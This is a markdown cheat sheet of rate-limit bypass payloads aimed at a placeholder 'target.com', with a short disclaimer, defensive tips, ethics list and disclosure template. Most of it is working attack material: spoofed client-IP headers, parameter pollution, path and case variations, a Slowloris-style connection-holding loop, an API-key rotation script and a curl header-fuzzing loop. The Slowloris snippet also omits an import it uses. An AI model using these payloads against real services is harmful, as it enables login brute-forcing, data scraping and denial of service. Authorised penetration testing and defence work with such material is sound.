# Rate Limit Bypass Testing Payloads

**Disclaimer**: This document is for educational purposes only. Only test systems you own or have explicit permission to test. Unauthorized testing may violate laws and terms of service.

## Common Rate Limit Bypass Techniques

### 1. IP Rotation Payload

```http
GET /api/v1/sensitive/data HTTP/1.1
Host: target.com
X-Forwarded-For: 1.2.3.4, 5.6.7.8, 9.10.11.12
CF-Connecting-IP: 13.14.15.16
True-Client-IP: 17.18.19.20
```

### 2. Header Manipulation

```http
POST /api/login HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
X-Request-ID: 7b8e4f5a-6d3c-4b9e-8a7d-1f2e3c4d5e6f
X-Client-Version: 1.0.3
X-Device-ID: 550e8400-e29b-41d4-a716-446655440000
```

### 3. Parameter Pollution

```
GET /api/data?user=test&user=admin&account=123&account=456 HTTP/1.1
Host: target.com
```

### 4. Endpoint Variation

```
GET /api/v1/data/
GET /api/v1/data
GET /api/v1/data//
GET /api/v1/data/?
GET /api/v1/data/?param=value
```

## Advanced Bypass Techniques

### 5. HTTP/2 Multiplexing

```http
:method: GET
:path: /api/user/data
:authority: target.com
:scheme: https
user-agent: Mozilla/5.0
accept: */*
cookie: session=abc123
```

### 6. Slowloris-style Request

```python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("target.com", 80))
s.send(b"POST /api/login HTTP/1.1\r\nHost: target.com\r\n")
while True:
    s.send(b"X-a: b\r\n")  # Send headers slowly
    time.sleep(10)
```

### 7. Case Variation

```
GET /API/User/Data
GET /Api/User/data
GET /api/user/DATA
```

## API Key Rotation

```python
import requests

api_keys = ["key1", "key2", "key3", "key4"]
url = "https://api.target.com/v1/data"

for i in range(100):
    headers = {"Authorization": f"Bearer {api_keys[i % len(api_keys)]}"}
    requests.get(url, headers=headers)
```

## Rate Limit Testing Methodology

1. **Baseline Establishment**
   ```bash
   curl -I -X GET https://api.target.com/endpoint
   ```

2. **Header Fuzzing**
   ```bash
   for header in "X-Forwarded-For" "CF-Connecting-IP" "True-Client-IP"; do
     curl -H "$header: 1.2.3.4" https://api.target.com/endpoint
   done
   ```

3. **Response Analysis**
   - HTTP 429 (Too Many Requests)
   - Retry-After headers
   - Custom rate limit headers

## Defensive Mechanisms

Legitimate systems should implement:
- Strict IP validation
- Request fingerprinting
- Token bucket algorithm
- Secondary verification challenges
- Behavioral analysis

## Ethical Considerations

1. Always obtain permission before testing
2. Document all tests thoroughly
3. Immediately report findings to system owners
4. Never use these techniques maliciously
5. Respect all `Retry-After` headers

## Responsible Disclosure Template

```markdown
# Rate Limit Vulnerability Report

**Endpoint**: `/api/v1/sensitive/data`
**Impact**: Potential data scraping/brute force vulnerability
**Reproduction Steps**:
1. Rotate X-Forwarded-For headers
2. Make 500+ requests/minute
3. Observe no rate limiting

**Suggested Fixes**:
- Implement strict IP validation
- Add request fingerprinting
- Add secondary CAPTCHA challenges
```